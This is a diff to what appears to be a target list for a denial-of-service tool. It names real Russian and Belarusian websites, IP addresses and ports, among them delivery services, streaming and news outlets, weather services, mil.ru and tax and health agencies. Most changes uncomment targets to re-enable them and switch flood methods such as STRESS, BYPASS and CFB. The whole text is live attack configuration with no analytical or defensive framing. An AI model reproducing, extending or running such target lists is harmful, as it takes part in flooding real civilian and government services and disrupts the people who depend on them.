@@ -29,13 +29,13 @@ https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://api.cdek.ru 
 http://178.248.238.208:80 http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
 
 ### rusvesna.su https://t.me/c/1624648668/87
-#http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB CFBUAM
+http://rusvesna.su/ http://m.rusvesna.su/ --http-methods CFB STRESS GET
 
 # https://carte.by/vitebsk/dostavka/
 https://carte.by/source/front/api.js https://carte.by/minsk/hpl/export/ https://carte.by/vitebsk/dostavka/ 193.176.182.165:80 193.176.182.165:443 tcp://193.176.182.165:80 tcp://193.176.182.165:443 tcp://193.176.182.165:2326  --http-methods BYPASS GET STRESS
 
 ### smotrim.ru 
-#tcp://80.249.129.244:443 tcp://80.249.129.244:80
+tcp://80.249.129.244:443 tcp://80.249.129.244:80
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
 https://vezetvsem.ru/ https://frontend.vezetvsem.ru/ https://www.vezetvsem.ru/how_to_work https://www.vezetvsem.ru/listing https://www.vezetvsem.ru/booking  --http-methods GET STRESS
@@ -50,7 +50,7 @@ https://cdek.ru https://lk.cdek.ru/user/login https://api.cdek.ru https://global
 
 tcp://185.165.123.40:80 tcp://185.165.123.40:443 tcp://178.248.238.208:80 tcp://178.248.238.208:443 tcp://178.248.238.62:80 tcp://178.248.238.62:443 tcp://195.189.222.55:80 tcp://195.189.222.55:443 tcp://185.165.123.206:80 tcp://185.165.123.206:443 tcp://194.49.120.60:80 tcp://194.49.120.60:443 tcp://195.189.222.56:80 tcp://195.189.222.56:443 tcp://195.189.222.41:22 tcp://195.189.222.41:80 tcp://195.189.222.41:443 tcp://194.49.120.61:80 tcp://194.49.120.61:443  tcp://194.49.121.18:443 tcp://194.49.121.18:3389 tcp://195.189.222.60:25 tcp://195.189.222.60:80 tcp://195.189.222.60:443 tcp://195.189.222.60:465 tcp://195.189.222.60:993 tcp://185.165.123.200:80 tcp://185.165.123.200:443
 
-https://fstec.ru/ http://fstec.ru/ --http-methods CFB
+https://fstec.ru/ http://fstec.ru/ --http-methods CFB STRESS
 
 http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
 
@@ -78,23 +78,23 @@ tcp://93.174.48.173:443 tcp://178.57.71.182:80 tcp://178.57.71.182:443 tcp://178
 
 tcp://91.189.116.40:443 tcp://91.189.116.40:993 tcp://91.189.116.40:995 tcp://91.189.116.41:443 tcp://91.189.116.41:993 tcp://91.189.116.41:995 tcp://91.189.116.42:443 tcp://91.189.116.42:993
 
-#https://okko.tv https://okko.sport/sport https://okko.tv/kids 185.169.155.118:80 185.169.155.118:443 https://185.169.155.118:443 tcp://185.169.155.118:80 tcp://185.169.155.118:443 --http-methods STRESS GET EVEN
+https://okko.tv https://okko.sport/sport https://okko.tv/kids 185.169.155.118:80 185.169.155.118:443 https://185.169.155.118:443 tcp://185.169.155.118:80 tcp://185.169.155.118:443 --http-methods STRESS GET EVEN
 
-#https://www.amediateka.ru https://www.amediateka.ru/kino1tv https://www.amediateka.ru/try-free tcp://212.193.156.175:80  tcp://212.193.156.175:443 tcp://212.193.146.216:80 tcp://212.193.146.216:443 --http-methods STRESS GET BYPASS
+https://www.amediateka.ru https://www.amediateka.ru/kino1tv https://www.amediateka.ru/try-free tcp://212.193.156.175:80  tcp://212.193.156.175:443 tcp://212.193.146.216:80 tcp://212.193.146.216:443 --http-methods STRESS GET BYPASS
 
-#https://wink.ru https://wink.ru/series https://wink.ru/collections 46.235.191.207:443 htts://46.235.191.207:443 tcp://46.235.191.207:443 37.220.163.158:443 https://37.220.163.158:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 212.193.155.253:443 https://212.193.155.253:443 tcp://212.193.155.253:80 tcp://212.193.155.253:443 --http-methods STRESS BYPASS GET
+https://wink.ru https://wink.ru/series https://wink.ru/collections 46.235.191.207:443 htts://46.235.191.207:443 tcp://46.235.191.207:443 37.220.163.158:443 https://37.220.163.158:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 212.193.155.253:443 https://212.193.155.253:443 tcp://212.193.155.253:80 tcp://212.193.155.253:443 --http-methods STRESS BYPASS GET
 
-#https://www.meteonova.ru http://www.meteonova.ru 93.174.129.242:80 93.174.129.242:443 https://93.174.129.242:443 tcp://93.174.129.242:22 tcp://93.174.129.242:25 tcp://93.174.129.242:80 tcp://93.174.129.242:111 tcp://93.174.129.242:443 tcp://93.174.129.242:3003 --http-methods STRESS GET EVEN
+https://www.meteonova.ru http://www.meteonova.ru 93.174.129.242:80 93.174.129.242:443 https://93.174.129.242:443 tcp://93.174.129.242:22 tcp://93.174.129.242:25 tcp://93.174.129.242:80 tcp://93.174.129.242:111 tcp://93.174.129.242:443 tcp://93.174.129.242:3003 --http-methods STRESS GET EVEN
 
 #udp://93.174.129.242:111 udp://93.174.129.242:123
 
-#https://meteoinfo.ru http://meteoinfo.ru https://meteoinfo.ru/novosti http://193.7.160.228:80 http://193.7.160.228:443 https://193.7.160.228:443 tcp://193.7.160.228:80 tcp://193.7.160.228:443 --http-methods STRESS GET
+https://meteoinfo.ru http://meteoinfo.ru https://meteoinfo.ru/novosti http://193.7.160.228:80 http://193.7.160.228:443 https://193.7.160.228:443 tcp://193.7.160.228:80 tcp://193.7.160.228:443 --http-methods STRESS GET
 
-#https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/  https://ekdostavka.ru http://ekdostavka.ru --http-methods DOWNLOADER BYPASS SLOW
+https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/  https://ekdostavka.ru http://ekdostavka.ru --http-methods DOWNLOADER BYPASS SLOW
 
 http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
 
-http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET DOWNLOADER
+http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET STRESS
 
 https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-methods GET STRESS
 
@@ -120,7 +120,7 @@ https://www.ponyexpress.ru/ tcp://185.10.63.194:80 tcp://185.10.63.194:443 --htt
 
 https://term.atol.ru https://www.atol.ru https://online.atol.ru tcp://178.57.71.182:443 tcp://178.57.71.189:443 tcp://178.57.71.190:443 tcp://185.31.134.103:443 tcp://185.31.134.104:443 --http-methods STRESS GET
 
-#https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 tcp://82.202.172.28:993 tcp://82.202.172.28:995 --http-methods STRESS GET HEAD
+https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 tcp://82.202.172.28:993 tcp://82.202.172.28:995 --http-methods STRESS GET HEAD
 
 #https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/ 151.236.80.10:80 151.236.80.10:443 https://151.236.80.10:443 tcp://151.236.80.10:80 tcp://151.236.80.10:443 tcp://93.85.84.202:22 tcp://93.85.84.202:80 tcp://93.85.84.202:443 --http-methods stress bypass head
 
@@ -130,9 +130,9 @@ https://k-porogu.com/delivery/all/rnd https://k-porogu.com/delivery/shashlik/rnd
 
 #94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:3306 --http-methods stress get head
 
-#https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80  --http-methods bypass get stress
-#runner.py https://broniboy.ru https://broniboy.ru/samara/restaurants/ 185.137.235.138:80 185.137.235.138:443 https://185.137.235.138:443 https://185.137.235.138:8433 tcp://185.137.235.138:22 tcp://185.137.235.138:53 tcp://185.137.235.138:80 tcp://185.137.235.138:443  --http-methods stress get head
-#runner.py https://groozgo.ru/ http://groozgo.ru/ 188.114.96.3:80 188.114.96.3:8080 188.114.96.3:443 188.114.96.3:8443 188.114.97.2:80 188.114.97.2:443 https://188.114.97.2:443 188.114.97.2:8080 https://188.114.97.2:8443 188.114.96.2:80 188.114.96.2:443 188.114.96.2:8443 https://188.114.96.2:443 https://188.114.96.2:8443 --http-methods cfb cfbuam stress
-#runner.py https://www.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 --http-methods get stress
-#runner.py tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:53 tcp://185.106.173.65:80 tcp://185.106.175.109:53 tcp://185.106.175.109:80 tcp://185.106.175.72:53 tcp://185.106.175.72:80 --http-methods TCP
+https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80  --http-methods bypass get stress
+https://broniboy.ru https://broniboy.ru/samara/restaurants/ 185.137.235.138:80 185.137.235.138:443 https://185.137.235.138:443 https://185.137.235.138:8433 tcp://185.137.235.138:22 tcp://185.137.235.138:53 tcp://185.137.235.138:80 tcp://185.137.235.138:443  --http-methods stress head
+https://groozgo.ru/ http://groozgo.ru/ 188.114.96.3:80 188.114.96.3:8080 188.114.96.3:443 188.114.96.3:8443 188.114.97.2:80 188.114.97.2:443 https://188.114.97.2:443 188.114.97.2:8080 https://188.114.97.2:8443 188.114.96.2:80 188.114.96.2:443 188.114.96.2:8443 https://188.114.96.2:443 https://188.114.96.2:8443 --http-methods cfb get stress
+
+tcp://185.106.172.117:53 tcp://185.106.172.117:80 tcp://185.106.173.65:53 tcp://185.106.173.65:80 tcp://185.106.175.109:53 tcp://185.106.175.109:80 tcp://185.106.175.72:53 tcp://185.106.175.72:80
 https://nm-shop.by/vitebsk/ http://nm-shop.by/vitebsk/ https://nm-shop.by/wholesale/ 178.172.136.190:80 178.172.136.190:443 178.172.136.190:1500  https://178.172.136.190:443 tcp://178.172.136.190:22 tcp://178.172.136.190:21 tcp://178.172.136.190:53 tcp://178.172.136.190:443  tcp://178.172.136.190:25  tcp://178.172.136.190:110  tcp://178.172.136.190:143  tcp://178.172.136.190:465  tcp://178.172.136.190:587  tcp://178.172.136.190:993  tcp://178.172.136.190:995  tcp://178.172.136.190:1500 --http-methods GET STRESS
